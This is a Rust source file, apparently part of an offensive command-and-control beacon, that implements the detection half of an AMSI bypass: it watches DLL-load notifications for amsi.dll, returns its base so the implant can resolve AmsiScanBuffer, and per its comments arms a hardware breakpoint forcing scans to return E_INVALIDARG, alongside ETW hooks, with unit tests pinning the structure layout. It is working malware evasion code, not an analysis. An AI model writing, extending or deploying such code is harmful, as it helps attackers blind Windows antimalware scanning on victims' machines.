//! AMSI neutralization, deferred through DLL-load notifications (port of the
//! original project's "amsi.dll not loaded yet" path).
//!
//! `amsi.dll` may not be mapped when the beacon starts: patching a function
//! that does not exist yet is deferred by registering an
//! `LdrRegisterDllNotification` callback. When amsi.dll loads, the callback
//! resolves `AmsiScanBuffer` in the freshly mapped base and arms the last
//! free debug slot (Dr3 — the ETW hooks own Dr0-Dr2). The hardware-breakpoint
//! variant, like the original's, synthesizes `E_INVALIDARG` on return without
//! touching a single code byte.
//!
//! Everything testable lives here: the notification layout and the "is this
//! the module we wait for" decision. The callback glue is in the beacon.

use core::ffi::c_void;

use crate::fnv::{fnv1a64_utf16_ci, fnv1a64_wide_ascii_ci};
use crate::peb::UnicodeString;

/// `LDR_DLL_NOTIFICATION_REASON_LOADED`.
pub const LDR_DLL_NOTIFICATION_REASON_LOADED: u32 = 1;

/// Partial `LDR_DLL_LOADED_NOTIFICATION_DATA` (the union member the beacon
/// reads; offsets pinned by tests).
#[repr(C)]
pub struct LdrDllNotificationData {
    pub flags: u32,                          // +0x00
    _pad: u32,                               // +0x04
    pub full_dll_name: *const UnicodeString, // +0x08
    pub base_dll_name: *const UnicodeString, // +0x10
    pub dll_base: *mut c_void,               // +0x18
    pub size_of_image: u32,                  // +0x20
}

/// The value `AmsiScanBuffer` must return for callers to give up on the scan
/// (the classic E_INVALIDARG patch, synthesized instead of written).
pub const AMSI_E_INVALIDARG: u64 = 0x8007_0057;

/// Hash of the module name we wait for (`amsi.dll`, case-insensitive —
/// folded at compile time).
#[inline]
pub const fn amsi_dll_name_hash() -> u64 {
    fnv1a64_wide_ascii_ci("amsi.dll")
}

/// Is this load notification the module we wait for? Returns the freshly
/// mapped base when it is: the caller resolves the target export in it and
/// arms its debug slot.
///
/// # Safety
///
/// `data` must either be null or point to a valid notification record as
/// produced by the loader on the thread raising it.
pub unsafe fn loaded_module_is(
    reason: u32,
    data: *const LdrDllNotificationData,
    name_hash: u64,
) -> Option<*mut c_void> {
    if reason != LDR_DLL_NOTIFICATION_REASON_LOADED || data.is_null() {
        return None;
    }
    let name = (*data).base_dll_name;
    if name.is_null() {
        return None;
    }
    let length = (*name).length;
    if length == 0 || (*name).buffer.is_null() {
        return None;
    }
    let units = core::slice::from_raw_parts((*name).buffer, (length / 2) as usize);
    if fnv1a64_utf16_ci(units) != name_hash {
        return None;
    }
    let base = (*data).dll_base;
    if base.is_null() {
        return None;
    }
    Some(base)
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::prelude::v1::*;

    /// Build a leaked notification record for a module name (wide) with the
    /// given base.
    fn notification_for(name: &str, base: usize) -> *const LdrDllNotificationData {
        let units: Vec<u16> = name.encode_utf16().collect();
        let full: Vec<u16> = format!("C:\\\\Windows\\\\System32\\{name}")
            .encode_utf16()
            .collect();
        let full_name = Box::leak(Box::new(UnicodeString {
            length: (full.len() * 2) as u16,
            maximum_length: (full.len() * 2) as u16,
            _pad: 0,
            buffer: full.leak().as_ptr() as *mut u16,
        }));
        let base_name = Box::leak(Box::new(UnicodeString {
            length: (units.len() * 2) as u16,
            maximum_length: (units.len() * 2) as u16,
            _pad: 0,
            buffer: units.leak().as_ptr() as *mut u16,
        }));
        Box::leak(Box::new(LdrDllNotificationData {
            flags: 0,
            _pad: 0,
            full_dll_name: full_name,
            base_dll_name: base_name,
            dll_base: base as *mut c_void,
            size_of_image: 0x1000,
        })) as *const LdrDllNotificationData
    }

    #[test]
    fn notification_layout_is_pinned() {
        use core::mem::{offset_of, size_of};
        assert_eq!(offset_of!(LdrDllNotificationData, full_dll_name), 0x08);
        assert_eq!(offset_of!(LdrDllNotificationData, base_dll_name), 0x10);
        assert_eq!(offset_of!(LdrDllNotificationData, dll_base), 0x18);
        assert_eq!(size_of::<LdrDllNotificationData>(), 0x28);
    }

    #[test]
    fn amsi_load_is_recognized() {
        let data = notification_for("amsi.dll", 0x7FF0_0000);
        let found = unsafe {
            loaded_module_is(
                LDR_DLL_NOTIFICATION_REASON_LOADED,
                data,
                amsi_dll_name_hash(),
            )
        };
        assert_eq!(found, Some(0x7FF0_0000 as *mut c_void));
    }

    #[test]
    fn amsi_load_is_case_insensitive() {
        let data = notification_for("AMSI.DLL", 0x7FF0_0000);
        let found = unsafe {
            loaded_module_is(
                LDR_DLL_NOTIFICATION_REASON_LOADED,
                data,
                amsi_dll_name_hash(),
            )
        };
        assert!(found.is_some());
    }

    #[test]
    fn other_modules_are_ignored() {
        let h = amsi_dll_name_hash();
        let data = notification_for("kernelbase.dll", 0x7FF0_0000);
        assert!(unsafe { loaded_module_is(LDR_DLL_NOTIFICATION_REASON_LOADED, data, h) }.is_none());
    }

    #[test]
    fn unload_reason_is_ignored() {
        let data = notification_for("amsi.dll", 0x7FF0_0000);
        assert!(unsafe { loaded_module_is(2, data, amsi_dll_name_hash()) }.is_none());
        assert!(unsafe {
            loaded_module_is(
                LDR_DLL_NOTIFICATION_REASON_LOADED,
                core::ptr::null(),
                amsi_dll_name_hash(),
            )
        }
        .is_none());
    }

    #[test]
    fn e_invalidarg_value_matches_the_classic_patch() {
        assert_eq!(AMSI_E_INVALIDARG, 0x8007_0057);
    }
}
